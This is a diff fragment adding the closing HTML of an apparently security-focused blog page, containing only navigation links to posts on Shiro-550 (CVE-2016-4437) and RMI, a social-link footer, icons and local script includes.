+      <a href='/docs/java/vulrecurrent/shiro-550cve-2016-4437/'>
+        <span aria-hidden='true'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="20" y1="12" x2="4" y2="12" />
+<polyline points="10 18 4 12 10 6" />
+</svg>
+ Previous</span>
+        <span class='screen-reader-text'>Previous post: </span>Shiro-550(CVE-2016-4437)</a>
+    </div><div class='next-entry sep-before'>
+      <a href='/docs/java/javagadget/rmi/'>
+        <span class='screen-reader-text'>Next post: </span>RMI<span aria-hidden='true'>Next <svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="4" y1="12" x2="20" y2="12" />
+<polyline points="14 6 20 12 14 18" />
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/n2ryx' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:experience_0109@163.com' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Contact via Email</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+<polyline points="22,6 12,13 2,6" />
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p></p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script><script src='/js/custom.js'></script>
+
+</body>
+
+</html>
+
